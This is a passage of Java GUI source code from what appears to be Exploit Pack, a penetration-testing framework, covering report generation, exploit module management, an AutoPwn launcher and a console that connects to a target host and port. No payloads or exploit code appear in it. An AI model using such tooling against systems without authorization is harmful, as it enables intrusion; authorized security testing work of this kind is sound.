                    + "				.style_20 { border-top: thin solid #808080; border-right: thin solid #808080; border-bottom: thin solid #808080; border-left: thin solid #808080;}\n"
                    + "				.style_21 { vertical-align: middle;}\n"
                    + "				.style_22 { font-family: sans-serif; font-weight: bold; font-size: 18pt; color: #004080;}\n"
                    + "				.style_23 { font-family: sans-serif; font-size: 10pt;}\n"
                    + "				.style_24 { font-family: sans-serif; font-weight: bold; font-size: 18pt;}\n"
                    + "				.style_25 { background-color: #ffffff; vertical-align: top;}\n"
                    + "				.style_32 { background-color: #4b6987;}\n"
                    + "				.style_43 { font-family: sans-serif; font-weight: bold; font-size: x-large;}\n"
                    + "				.style_45 { font-family: sans-serif; font-style: italic; font-weight: bold; font-size: x-large; padding-top: 2pt; padding-right: 2pt; padding-bottom: 2pt; padding-left: 2pt;}\n"
                    + "				.style_52 { background-color: orange;}\n"
                    + "				.style_54 { font-family: sans-serif; font-weight: bold; padding-top: 2pt; padding-right: 2pt; padding-bottom: 2pt; padding-left: 2pt;}\n"
                    + "				.style_56 { font-family: sans-serif; padding-top: 2pt; padding-right: 2pt; padding-bottom: 2pt; padding-left: 2pt;}\n"
                    + "				.style_58 { font-family: sans-serif; padding-top: 2pt; padding-right: 2pt; padding-bottom: 2pt; padding-left: 2pt;}\n"
                    + "				.style_61 { font-family: sans-serif; font-size: x-small;}\n"
                    + "		</style>");
            out.append("	<!--[if gte IE 5.5000]>\n"
                    + "		   <script language=\"JavaScript\"> var ie55up = true </script>\n"
                    + "		<![endif]-->\n"
                    + "		<script language=\"JavaScript\">\n"
                    + "		   function fixPNG(myImage) // correctly handle PNG transparency in Win IE 5.5 or higher.\n"
                    + "		      {\n"
                    + "		      if (window.ie55up)\n"
                    + "		         {\n"
                    + "		         var imgID = (myImage.id) ? \"id='\" + myImage.id + \"' \" : \"\"\n"
                    + "		         var imgClass = (myImage.className) ? \"class='\" + myImage.className + \"' \" : \"\"\n"
                    + "		         var imgTitle = (myImage.title) ? \"title='\" + myImage.title + \"' \" : \"title='\" + myImage.alt + \"' \"\n"
                    + "		         var imgStyle = \"display:inline-block;\" + myImage.style.cssText\n"
                    + "		         var strNewHTML = \"<span \" + imgID + imgClass + imgTitle\n"
                    + "		         strNewHTML += \" style=\\\"\" + \"width:\" + myImage.width + \"px; height:\" + myImage.height + \"px;\" + imgStyle + \";\"\n"
                    + "		         strNewHTML += \"filter:progid:DXImageTransform.Microsoft.AlphaImageLoader\"\n"
                    + "		         strNewHTML += \"(src=\\'\" + myImage.src + \"\\', sizingMethod='scale');\\\"></span>\"\n"
                    + "		         myImage.outerHTML = strNewHTML\n"
                    + "		         }\n"
                    + "		      }\n"
                    + "		</script>\n"
                    + "	</head>");
            out.append("	<body class=\"style_0\">\n"
                    + "		<table class=\"style_15\" style=\" width: 100%;\">\n"
                    + "			<colgroup><col style=\" width: 2.8in;\">\n"
                    + "			<col style=\" width: 3.125in;\">\n"
                    + "			</colgroup><tbody>\n"
                    + "				<tr class=\"style_18\">\n"
                    + "					<td>\n"
                    + "						<div>\n"
                    + "							<img  width=\"300\" src=\"" + imglogo + "\">\n"
                    + "						</div>\n"
                    + "					</td>\n"
                    + "					<td class=\"style_21\">\n"
                    + "						<div class=\"style_22\" style=\"margin-left:-180px;\">\n"
                    + "					Penetration Test Report - Generated using Exploit Pack	\n"
                    + "						</div>\n"
                    + "						<div class=\"style_23\" style=\"margin-left:-180px;\">\n"
                    + "							<br>\n"
                    + "							<br>" + LogTime + "\n"
                    + "							<br>\n"
                    + "							<br>\n"
                    + "						</div>\n"
                    + "						<div class=\"style_24\" style=\"margin-left:-180px;\">\n"
                    + "							" + jTextFieldPentestSubTittle.getText() + "\n"
                    + "						</div>\n"
                    + "					</td>\n"
                    + "				</tr>\n"
                    + "				<tr class=\"style_25\" style=\" height: 0.25in;\">\n"
                    + "					<td></td>\n"
                    + "					<td class=\"style_21\"></td>\n"
                    + "				</tr>\n"
                    + "			</tbody>\n"
                    + "		</table>");
            out.append("	<table style=\" width: 100%;\">\n"
                    + "			<colgroup><col style=\" width: 3.114in;\">\n"
                    + "			<col style=\" width: 1.427in;\">\n"
                    + "			<col style=\" width: 1.427in;\">\n"
                    + "			</colgroup><tbody>\n"
                    + "\n"
                    + "\n"
                    + "<!-- HEADER -->\n"
                    + "<tr class=\"style_32\" style=\" height: 0.1in;\">\n"
                    + "					<td class=\"style_32\"></td>\n"
                    + "					<td class=\"style_32\"></td>\n"
                    + "					<td class=\"style_32\"></td>\n"
                    + "				</tr>\n"
                    + "				<tr style=\" height: 0.1in;\">\n"
                    + "					<td colspan=\"3\">\n"
                    + "						<table style=\" width: 100%;\">\n"
                    + "							<colgroup><col style=\" width: 2.093in;\">\n"
                    + "							<col style=\" width: 3.802in;\">\n"
                    + "							</colgroup><tbody>\n"
                    + "								<tr>\n"
                    + "									<td>\n"
                    + "										<div class=\"style_43\">\n"
                    + "										Overview and Results\n"
                    + "										</div>\n"
                    + "									</td>\n"
                    + "									<td>\n"
                    + "										<div class=\"style_45\">\n"
                    + "												1. Executive Summary\n"
                    + "										</div>\n"
                    + "									</td>\n"
                    + "								</tr>\n"
                    + "							</tbody>\n"
                    + "						</table>\n"
                    + "					</td>\n"
                    + "				</tr>\n"
                    + "\n"
                    + "                                <tr>\n"
                    + "                                        <td colspan=\"3\">\n"
                    + "                                                <div class=\"style_56\">\n"
                    + "                                               " + jTextAreaPentestHeader.getText() + " \n"
                    + "						</div>\n"
                    + "                                        </td>\n"
                    + "                                </tr>\n"
                    + "                                <tr style=\" height: 0.25in;\">\n"
                    + "                                        <td></td>\n"
                    + "                                        <td></td>\n"
                    + "                                        <td></td>\n"
                    + "                                </tr>\n"
                    + "\n"
                    + "\n"
                    + "				<tr class=\"style_32\" style=\" height: 0.1in;\">\n"
                    + "					<td class=\"style_32\" colspan=\"3\"></td>\n"
                    + "				</tr>\n"
                    + "				<tr style=\" height: 0.25in;\">\n"
                    + "					<td></td>\n"
                    + "					<td></td>\n"
                    + "					<td></td>\n"
                    + "				</tr>");
            out.append(" <!-- FINDINGS -->\n"
                    + "                <tr class=\"style_32\" style=\" height: 0.1in;\">\n"
                    + "                    <td class=\"style_32\"></td>\n"
                    + "                    <td class=\"style_32\"></td>\n"
                    + "                    <td class=\"style_32\"></td>\n"
                    + "                </tr>\n"
                    + "                <tr style=\" height: 0.1in;\">\n"
                    + "                    <td colspan=\"3\">\n"
                    + "                        <table style=\" width: 100%;\">\n"
                    + "                            <colgroup><col style=\" width: 2.093in;\">\n"
                    + "                                <col style=\" width: 3.802in;\">\n"
                    + "                                    </colgroup><tbody>\n"
                    + "                                        <tr>\n"
                    + "                                            <td>\n"
                    + "                                                <div class=\"style_43\">\n"
                    + "                                                    Vulnerability Details                                </div>\n"
                    + "                                            </td>\n"
                    + "                                            <td>\n"
                    + "                                                <div class=\"style_45\">\n"
                    + "                                                    2. List of Findings\n"
                    + "                                                </div>\n"
                    + "                                            </td>\n"
                    + "                                        </tr>\n"
                    + "                                    </tbody>\n"
                    + "                        </table>\n"
                    + "                    </td>\n"
                    + "                </tr>\n"
                    + "                \n"
                    + "                <tr>\n"
                    + "                    <td colspan=\"3\">\n"
                    + "            <hr>");

            // FINDING
            String filename = "output/executionlog.eplog";
            // Read file
            FileReader fstreamfinding = new FileReader(filename);
            BufferedReader infinding = new BufferedReader(fstreamfinding);
            String stringToAppend;
            while ((stringToAppend = infinding.readLine()) != null) {
                if (stringToAppend.contains("EXPLOIT NAME:")) {
                    out.append("<!-- VULNERABILITY-->\n"
                            + "                    <div class=\"style_56\">\n"
                            + "                            <tr class=\"style_52\">\n"
                            + "                                <td class=\"style_52\">\n"
                            + "                                    <div class=\"style_54\">\n"
                            + "                                        Name: " + stringToAppend.replace("EXPLOIT NAME:", "") + "\n");

                }
                if (stringToAppend.contains("EXPLOIT TYPE:")) {
                    out.append("                                    </div>\n"
                            + "                                </td>\n"
                            + "                                <td class=\"style_52\">\n"
                            + "                                    <div class=\"style_56\" style=\"margin-left:-210px;\">\n"
                            + "                                        Module type: " + stringToAppend.replace("EXPLOIT TYPE:", "") + "\n"
                            + "                                    </div>\n"
                            + "                                </td>\n");

                }
                if (stringToAppend.contains("EXPLOIT PLATFORM:")) {
                    out.append("                                <td class=\"style_52\">\n"
                            + "                                    <div class=\"style_58\">\n"
                            + "                                        Platform: " + stringToAppend.replace("EXPLOIT PLATFORM:", "") + "\n");
                }
                if (stringToAppend.contains("EXPLOIT DESCRIPTION:")) {
                    out.append("                                    </div>\n"
                            + "                                </td>\n"
                            + "                            </tr>\n"
                            + "                            <tr>\n"
                            + "                                <td colspan=\"3\">\n"
                            + "                                    <div class=\"style_56\">\n"
                            + "                                       " + stringToAppend.replace("EXPLOIT DESCRIPTION:", "") + "                                    </div>\n"
                            + "                                </td>\n"
                            + "                            </tr>\n"
                            + "                            <tr style=\" height: 0.25in;\">\n"
                            + "                                <td></td>\n"
                            + "                                <td></td>\n"
                            + "                                <td></td>\n"
                            + "                            </tr>\n"
                            + "                            \n"
                            + "                        </div>\n"
                            + "           <!-- END VULNERABILITY --> ");
                }
            }
            // Close the output stream
            infinding.close();

            // MANUAL FINDING 1
            out.append("<!-- VULNERABILITY-->\n"
                    + "                    <div class=\"style_56\">\n"
                    + "                            <tr class=\"style_52\">\n"
                    + "                                <td class=\"style_52\">\n"
                    + "                                    <div class=\"style_54\">\n"
                    + "                                        Name: " + jTextFieldCustom1.getText() + "\n");

            out.append("                                    </div>\n"
                    + "                                </td>\n"
                    + "                                <td class=\"style_52\">\n"
                    + "                                    <div class=\"style_56\" style=\"margin-left:-210px;\">\n"
                    + "                                        Module type: " + "Custom" + "\n"
                    + "                                    </div>\n"
                    + "                                </td>\n");

            out.append("                                <td class=\"style_52\">\n"
                    + "                                    <div class=\"style_58\">\n"
                    + "                                        Risk level: " + jComboBoxCustom1.getSelectedItem().toString() + "\n");

            out.append("                                    </div>\n"
                    + "                                </td>\n"
                    + "                            </tr>\n"
                    + "                            <tr>\n"
                    + "                                <td colspan=\"3\">\n"
                    + "                                    <div class=\"style_56\">\n"
                    + "                                       " + jTextFieldCustomDesc1.getText() + "                                    </div>\n"
                    + "                                </td>\n"
                    + "                            </tr>\n"
                    + "                            <tr style=\" height: 0.25in;\">\n"
                    + "                                <td></td>\n"
                    + "                                <td></td>\n"
                    + "                                <td></td>\n"
                    + "                            </tr>\n"
                    + "                            \n"
                    + "                        </div>\n"
                    + "           <!-- END VULNERABILITY --> ");

            // MANUAL FINDING 2
            out.append("<!-- VULNERABILITY-->\n"
                    + "                    <div class=\"style_56\">\n"
                    + "                            <tr class=\"style_52\">\n"
                    + "                                <td class=\"style_52\">\n"
                    + "                                    <div class=\"style_54\">\n"
                    + "                                        Name: " + jTextFieldCustom2.getText() + "\n");

            out.append("                                    </div>\n"
                    + "                                </td>\n"
                    + "                                <td class=\"style_52\">\n"
                    + "                                    <div class=\"style_56\" style=\"margin-left:-210px;\">\n"
                    + "                                        Module type: " + "Custom" + "\n"
                    + "                                    </div>\n"
                    + "                                </td>\n");

            out.append("                                <td class=\"style_52\">\n"
                    + "                                    <div class=\"style_58\">\n"
                    + "                                        Risk level: " + jComboBoxCustom2.getSelectedItem().toString() + "\n");

            out.append("                                    </div>\n"
                    + "                                </td>\n"
                    + "                            </tr>\n"
                    + "                            <tr>\n"
                    + "                                <td colspan=\"3\">\n"
                    + "                                    <div class=\"style_56\">\n"
                    + "                                       " + jTextFieldCustomDesc2.getText() + "                                    </div>\n"
                    + "                                </td>\n"
                    + "                            </tr>\n"
                    + "                            <tr style=\" height: 0.25in;\">\n"
                    + "                                <td></td>\n"
                    + "                                <td></td>\n"
                    + "                                <td></td>\n"
                    + "                            </tr>\n"
                    + "                            \n"
                    + "                        </div>\n"
                    + "           <!-- END VULNERABILITY --> ");
            // END OF MANUAL
            out.append("                  </td>\n"
                    + "                </tr>\n"
                    + "                <tr style=\" height: 0.25in;\">\n"
                    + "                    <td></td>\n"
                    + "                    <td></td>\n"
                    + "                    <td></td>\n"
                    + "                </tr>\n"
                    + "                \n"
                    + "                <tr class=\"style_32\" style=\" height: 0.1in;\">\n"
                    + "                    <td class=\"style_32\" colspan=\"3\"></td>\n"
                    + "                </tr>\n"
                    + "                <tr style=\" height: 0.25in;\">\n"
                    + "                    <td></td>\n"
                    + "                    <td></td>\n"
                    + "                    <td></td>\n"
                    + "                </tr>\n"
                    + "            <!-- FOOTER -->\n"
                    + "                <tr class=\"style_32\" style=\" height: 0.1in;\">\n"
                    + "                    <td class=\"style_32\"></td>\n"
                    + "                    <td class=\"style_32\"></td>\n"
                    + "                    <td class=\"style_32\"></td>\n"
                    + "                </tr>\n"
                    + "                <tr style=\" height: 0.1in;\">\n"
                    + "                    <td colspan=\"3\">\n"
                    + "                        <table style=\" width: 100%;\">\n"
                    + "                            <colgroup><col style=\" width: 2.093in;\">\n"
                    + "                                <col style=\" width: 3.802in;\">\n"
                    + "                                    </colgroup><tbody>\n"
                    + "                                        <tr>\n"
                    + "                                            <td>\n"
                    + "                                                <div class=\"style_43\">\n"
                    + "                                                    Summary and Conclusions\n"
                    + "                                                </div>\n"
                    + "                                            </td>\n"
                    + "                                            <td>\n"
                    + "                                                <div class=\"style_45\">\n"
                    + "                                                3. Recommendations\n"
                    + "                                                </div>\n"
                    + "                                            </td>\n"
                    + "                                        </tr>\n"
                    + "                                    </tbody>\n"
                    + "                        </table>\n"
                    + "                    </td>\n"
                    + "                </tr>\n"
                    + "                \n"
                    + "                <tr>\n"
                    + "                    <td colspan=\"3\">\n"
                    + "                        <div class=\"style_56\">\n"
                    + "                            " + jTextAreaPentestFooter.getText() + "\n"
                    + "                        </div>\n"
                    + "                    </td>\n"
                    + "                </tr>\n"
                    + "                <tr style=\" height: 0.25in;\">\n"
                    + "                    <td></td>\n"
                    + "                    <td></td>\n"
                    + "                    <td></td>\n"
                    + "                </tr>\n"
                    + "                \n"
                    + "                <tr class=\"style_32\" style=\" height: 0.1in;\">\n"
                    + "                    <td class=\"style_32\" colspan=\"3\"></td>\n"
                    + "                </tr>\n"
                    + "                <tr style=\" height: 0.25in;\">\n"
                    + "                    <td></td>\n"
                    + "                    <td></td>\n"
                    + "                    <td></td>\n"
                    + "                </tr>\n"
                    + "			</tbody>\n"
                    + "		</table>\n"
                    + "        <center style=\"font-family: verdana;\">Please consider making a donation to Exploit Pack Project.</center>\n"
                    + "</body></html>");
            //Close the output stream
            out.close();

            // Open report
            int reply = JOptionPane.showConfirmDialog(null, "Report \"" + jTextFieldPentestName.getText() + "\" created successfully. Should I open the report for you?", "Exploit Pack says:", JOptionPane.YES_NO_OPTION);
            if (reply == JOptionPane.YES_OPTION) {
                String url = "file:///" + dir.getAbsolutePath() + "/" + jTextFieldPentestName.getText() + ".html";
                Desktop.getDesktop().browse(java.net.URI.create(url));
            } else {
                JOptionPane.showMessageDialog(null, "Report \"" + jTextFieldPentestName.getText() + "\" exported to output folder.", "Exploit Pack says:", JOptionPane.INFORMATION_MESSAGE);

            }
        } catch (IOException ex) {
            Logger.getLogger(MainFrame.class
                    .getName()).log(Level.SEVERE, null, ex);
        }
    }//GEN-LAST:event_jButton2ActionPerformed

    private void jButton11ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton11ActionPerformed
        String filename = "";
        // TODO add your handling code here:
        JFileChooser fileChooser = new JFileChooser(new File(filename));
        fileChooser.showSaveDialog(this);
        jTextFieldPentestImage.setText(fileChooser.getSelectedFile().toString());
    }//GEN-LAST:event_jButton11ActionPerformed

    private void jTextFieldPentestSubTittleMouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jTextFieldPentestSubTittleMouseClicked
        // TODO add your handling code here:
        if (jTextFieldPentestSubTittle.getText().contains("Vulnerability report 2017")) {
            jTextFieldPentestSubTittle.setText("");
        }
    }//GEN-LAST:event_jTextFieldPentestSubTittleMouseClicked

    private void jTextFieldPentestNameActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jTextFieldPentestNameActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_jTextFieldPentestNameActionPerformed

    private void jTextFieldPentestNameMouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jTextFieldPentestNameMouseClicked
        // TODO add your handling code here:
        if (jTextFieldPentestName.getText().contains("My first pentest using Exploit Pack")) {
            jTextFieldPentestName.setText("");
        }
    }//GEN-LAST:event_jTextFieldPentestNameMouseClicked

    private void jButton15ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton15ActionPerformed
        // TODO add your handling code here:
        // TODO add your handling code here:
        File file = new File("exploits/code/" + exploit.getCodeName());

        try (FileWriter fileWriter = new FileWriter(file)) {
            fileWriter.write(jTextAreaTargets.getText());

        } catch (IOException e) {
            Logger.getLogger(MainFrame.class
                    .getName()).log(Level.SEVERE, null, e);
        }
    }//GEN-LAST:event_jButton15ActionPerformed

    private void jButton23ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton23ActionPerformed
        // TODO add your handling code here:
        AutoPwn.main(null);
    }//GEN-LAST:event_jButton23ActionPerformed

    private void jButton22ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton22ActionPerformed
        // TODO add your handling code here:
        // TODO add your handling code here:

        String name = jLabelTargetName.getText();
        File fileCode = new File("exploits/code/" + name + ".txt");
        if (fileCode.exists()) {
            fileCode.delete();
        } else {
            System.err.println(
                    "I cannot find '" + fileCode + "' ('" + fileCode.getAbsolutePath() + "')");
        }

        File fileXML = new File("exploits/" + name + ".xml");
        if (fileXML.exists()) {
            fileXML.delete();
        } else {
            System.err.println(
                    "I cannot find '" + fileXML + "' ('" + fileXML.getAbsolutePath() + "')");
        }
        jMenuItem12.doClick();
    }//GEN-LAST:event_jButton22ActionPerformed

    private void jButton24ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton24ActionPerformed
        // TODO add your handling code here:
        String path = "exploits/";
        String files;
        File folder = new File(path);
        File[] listOfFiles = folder.listFiles();
        boolean notfound = true;
        for (int i = 0; i < listOfFiles.length; i++) {
            if (listOfFiles[i].isFile()) {
                files = listOfFiles[i].getName();
                // Instance of XMLTreenode
                NewXMLNode = new XMLTreenode();
                // Start of the class main of XMLTreenode
                NewXMLNode.main(null, files);
                System.out.println(NewXMLNode.RemotePort);
            }
        }
    }//GEN-LAST:event_jButton24ActionPerformed

    private void jTextFieldShellinputKeyPressed(java.awt.event.KeyEvent evt) {//GEN-FIRST:event_jTextFieldShellinputKeyPressed
        // TODO add your handling code here:
        if (evt.getKeyChar() == KeyEvent.VK_ENTER) {
            jButtonShell.doClick();
        }
    }//GEN-LAST:event_jTextFieldShellinputKeyPressed

    private void jTextFieldShellinputMouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jTextFieldShellinputMouseClicked
        // TODO add your handling code here:
        jTextFieldShellinput.setText("");
    }//GEN-LAST:event_jTextFieldShellinputMouseClicked

    private void jButtonShellActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButtonShellActionPerformed
//        final Thread gdbThread;
//        gdbThread = new Thread("gdbThread") {
//            @Override
//            public void run() {
//                try {
//                    final Process p = new ProcessBuilder("/usr/bin/gdb").start();
//
//                    // Print errors
//                    new Thread(() -> {
//                        BufferedReader ir = new BufferedReader(new InputStreamReader(p.getErrorStream()));
//                        String line = null;
//                        try {
//                            while ((line = ir.readLine()) != null) {
//                                System.out.printf(line);
//                            }
//                        } catch (IOException e) {
//                        }
//                    }).start();
//
//                    // Print outpout
//                    new Thread(() -> {
//                        BufferedReader ir = new BufferedReader(new InputStreamReader(p.getInputStream()));
//                        String line = null;
//                        try {
//                            while ((line = ir.readLine()) != null) {
//                                System.out.printf("%s\n", line);
//                                try {
//                                    p.wait();
//                                } catch (InterruptedException ex) {
//                                    Logger.getLogger(MainFrame.class.getName()).log(Level.SEVERE, null, ex);
//                                }
//                            }
//                        } catch (IOException ex) {
//                            System.out.println(ex);
//                        }
//                    }).start();
//
//                    // Print exit
//                    new Thread(() -> {
//                        int exitCode = 0;
//                        try {
//                            exitCode = p.waitFor();
//                        } catch (InterruptedException e) {
//                            e.printStackTrace();
//                        }
//                        System.out.printf("Exited with code %d\n", exitCode);
//                    }).start();
//
//                    // final Scanner sc = new Scanner(System.in);
//                    final BufferedWriter bf = new BufferedWriter(new OutputStreamWriter(p.getOutputStream()));
//                    final String newLine = System.getProperty("line.separator");
//                    boolean cmdGDB = true;
//                    while (true) {
//                        if (cmdGDB) {
//                            String c = jTextFieldShellinput.getText();
//                            bf.write(c);
//                            bf.newLine();
//                            bf.flush();
//                        }
//                        cmdGDB = false;
//                    }
//
//                } catch (Exception e) {
//                    Logger.getLogger(MainFrame.class
//                            .getName()).log(Level.SEVERE, null, e);
//                }
//            }
//        };
//        gdbThread.start();

        String Switch = jTextFieldShellinput.getText();
        if ((Switch.equals("connect") || (Switch.equals("c")) || (Switch
                .equals("y")))) {

            jTextAreaShellcode
                    .setText("Connecting to the target: \n"
                            + "IP:" + jTextFieldTargetH.getText() + "\n" + "PORT:" + jTextFieldshellPort.getText() + "\n");
            jTextAreaShellcode
                    .append("Please wait while I open a console for you..\n");
            Connect.main(null, jTextFieldTargetH.getText(), jTextFieldshellPort.getText());

            // Clean input
            jTextFieldShellinput.setText("");
        }
        if ((Switch.equals("doitnow"))) {
            Exploits exploit = new Exploits();
            exploit.run();
        }
        // Connect
        if ((Switch.equals("check") || (Switch.equals("chk")))) {
            jTextAreaShellcode
                    .setText("Checking shellcode connection"
                            + "\n");

        }

        // Help
        if ((Switch.equals("help") || (Switch.equals("h") || (Switch
                .equals("?"))))) {
            jTextAreaShellcode
                    .setText("Exploit Pack is an open source tool for security auditing, exploit,\n");
            jTextAreaShellcode
                    .append("development and penetration testing. \nMore information at: http://exploitpack.com\n");
            jTextAreaShellcode
                    .append("Get involved or join us, contact: support@exploitpack.com\n");

            jTextAreaShellcode.append("\n");
            jTextAreaShellcode.append("Example commands :\n");
            jTextAreaShellcode.append("------------------\n");
            jTextAreaShellcode.append("Help menu: ? or help\n");
            jTextAreaShellcode.append("Home: h or home\n");
            jTextAreaShellcode
                    .append("List sessions: ls or sessions\n");
            jTextAreaShellcode
                    .append("Connect to: c or connect\n");
            jTextAreaShellcode
                    .append("Exit Exploit Pack: quit or exit\n");
            jTextAreaShellcode
                    .append("Check shellcode: check or chk\n");
            jTextAreaShellcode
                    .append("Disconnect from: d or disconnect\n");
            jTextAreaShellcode.append("Version: v or version\n");
// Clean input
            jTextFieldShellinput.setText("");
            jTextAreaShellcode.setCaretPosition(0);
        }
// Help
        if ((Switch.equals("h") || (Switch.equals("home")))) {
            jTextAreaShellcode
                    .setText("Hello user. Welcome to Exploit Pack - Triforce - Version: "
                            + "7.5"
                            + "\nWARNING: There is no warranty for this piece of software. \r\nprograms or scripts included with Exploit Pack are free software;\r\nUPDATES: Please try to keep Exploit Pack up to date\r\n\r\nTo start using this console: Type ? for help.");
            jTextAreaShellcode
                    .append("\n\n\"Moonlight drowns out all but the brightest stars.\" ― J.R.R. Tolkien");
            jTextAreaShellcode.append("\n");
            jTextAreaShellcode.setCaretPosition(0);
            // Clean input
            jTextFieldShellinput.setText("");
        }
        // Session list
        if ((Switch.equals("session") || (Switch.equals("s") || (Switch
                .equals("ls"))))) {
            jTextAreaShellcode.setText("Active sessions: 0\r\n");
            jTextAreaShellcode.append("Seems like you dont have any active session\nyou should hack something.. \n");
// Clean input
            jTextFieldShellinput.setText("");
            jTextAreaShellcode.setCaretPosition(0);
        }

// Session list
        if ((Switch.equals("exit") || (Switch.equals("quit")))) {
            System.exit(0);
        }

        // Version
        if ((Switch.equals("version") || (Switch.equals("v")))) {
            jTextAreaShellcode
                    .setText("Exploit Pack - Triforce - v7.5\n");
            jTextAreaShellcode
                    .append("Author: Exploit Pack <support@exploitpack.com>\n");
            jTextAreaShellcode
                    .append("Platform: JAVA - x86_64-linux-gnu\n");
            jTextAreaShellcode
                    .append("Platform available: Win8 - x86-32 - OSX - GNU/Linux\n");
            jTextAreaShellcode.append("Version: "
                    + "7.5"
                    + " - http://exploitpack.com" + "\n\n");
            jTextAreaShellcode
                    .append("\"It's the job that's never started as takes longest to finish.\"\n");

            // Clean input
            jTextFieldShellinput.setText("");
            jTextAreaShellcode.setCaretPosition(0);
        }

        // Disconnect
        if ((Switch.equals("disconnect") || (Switch.equals("d")) || (Switch
                .equals("n")))) {
            jTextAreaShellcode.setText("Closing connection from "
                    + jTextFieldTargetH.getText() + "\n");
            jTextAreaShellcode.append("Done.\n");
            // Clean input
            jTextFieldShellinput.setText("");
        }

        // Clean input
        jTextFieldShellinput.setText("");
    }//GEN-LAST:event_jButtonShellActionPerformed

    private void jButton18ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton18ActionPerformed
        // TODO add your handling code here:
        Desktop desktop;
        try {
            if (Desktop.isDesktopSupported()
                    && (desktop = Desktop.getDesktop()).isSupported(Desktop.Action.MAIL)) {
                URI mailto = new URI("mailto:submit@exploitpack.com?subject=Submit%20an%20Exploit&body=PASTE%20YOUR%20EXPLOIT%20CODE%20AND%20XML%20FILE%20HERE.");
                desktop.mail(mailto);

            } else {
                // TODO fallback to some Runtime.exec(..) voodoo?
                throw new RuntimeException("desktop doesn't support mailto; mail is dead anyway ;)");

            }
        } catch (URISyntaxException | IOException ex) {
            Logger.getLogger(MainFrame.class
                    .getName()).log(Level.SEVERE, null, ex);
        }
    }//GEN-LAST:event_jButton18ActionPerformed

    private void jButton19ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton19ActionPerformed
        // TODO add your handling code here:
        Preferences.main(null);
    }//GEN-LAST:event_jButton19ActionPerformed

    private void jButton20ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton20ActionPerformed
        // TODO add your handling code here:
        // TODO add your handling code here:
        File file = new File("output/exploitUpload");

        try (FileWriter fileWriter = new FileWriter(file)) {
            fileWriter.write(jTextAreaModuleEditor.getText());

        } catch (IOException e) {
            Logger.getLogger(MainFrame.class
                    .getName()).log(Level.SEVERE, null, e);
        }
        JOptionPane.showMessageDialog(null, "Exploit ready to upload, please connect to your shell.", "Exploit Pack says:", JOptionPane.INFORMATION_MESSAGE);
    }//GEN-LAST:event_jButton20ActionPerformed

    private void jButton17ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton17ActionPerformed
        // TODO add your handling code here:
        File file = new File("exploits/code/" + exploit.getCodeName());

        try (FileWriter fileWriter = new FileWriter(file)) {
            fileWriter.write(jTextAreaModuleEditor.getText());

        } catch (IOException e) {
            Logger.getLogger(MainFrame.class
                    .getName()).log(Level.SEVERE, null, e);
        }
    }//GEN-LAST:event_jButton17ActionPerformed

    private void jButton16ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton16ActionPerformed
        // TODO add your handling code here:

        String newExploit = "# Exploit developed using Exploit Pack v7.5" + "\n\r";
        newExploit += "# Name: John Doe - Email: john@doe" + "\n\r";
        newExploit += "# ADD YOUR CODE BELOW THIS LINE" + "\n\r";
        jTextAreaModuleEditor.setText(newExploit);
        jTextAreaModuleEditor.setCaretPosition(0);
        ExploitWizard.main(null);
    }//GEN-LAST:event_jButton16ActionPerformed

    private void jTextFieldExtraOptionsActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jTextFieldExtraOptionsActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_jTextFieldExtraOptionsActionPerformed

    private void jTextFieldExtraOptionsMouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jTextFieldExtraOptionsMouseClicked
        // TODO add your handling code here:
        jTextFieldExtraOptions.setText("");
    }//GEN-LAST:event_jTextFieldExtraOptionsMouseClicked

    private void jTextFieldTargetPMouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jTextFieldTargetPMouseClicked
        // TODO add your handling code here:
        jTextFieldTargetP.setText("");
    }//GEN-LAST:event_jTextFieldTargetPMouseClicked

    private void jTextFieldTargetHMouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jTextFieldTargetHMouseClicked
        // TODO add your handling code here:
        if (jTextFieldTargetH.getText().contains("127.0.0.1")) {
            jTextFieldTargetH.setText("");
        }
    }//GEN-LAST:event_jTextFieldTargetHMouseClicked

    private void jButtonShell1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButtonShell1ActionPerformed
        // TODO add your handling code here:
        jTextAreaShellcode.setText("");
    }//GEN-LAST:event_jButtonShell1ActionPerformed

    private void jButton26ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton26ActionPerformed
        // TODO add your handling code here:
        ClientsideWizard.main(null);
    }//GEN-LAST:event_jButton26ActionPerformed

    private void jButton27ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton27ActionPerformed
        // TODO add your handling code here:
        ExploitWizardEditor.main(exploit);
    }//GEN-LAST:event_jButton27ActionPerformed

    private void jMenuItem58ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem58ActionPerformed
        // TODO add your handling code here:
        try {
            File htmlFile = new File("data/test.html");
            Desktop.getDesktop().browse(htmlFile.toURI());

        } catch (IOException ex) {
            Logger.getLogger(MainFrame.class
                    .getName()).log(Level.SEVERE, null, ex);
        }
    }//GEN-LAST:event_jMenuItem58ActionPerformed

    private void jMenuItem59ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem59ActionPerformed
        // TODO add your handling code here:
        ClientsideWizard.main(null);
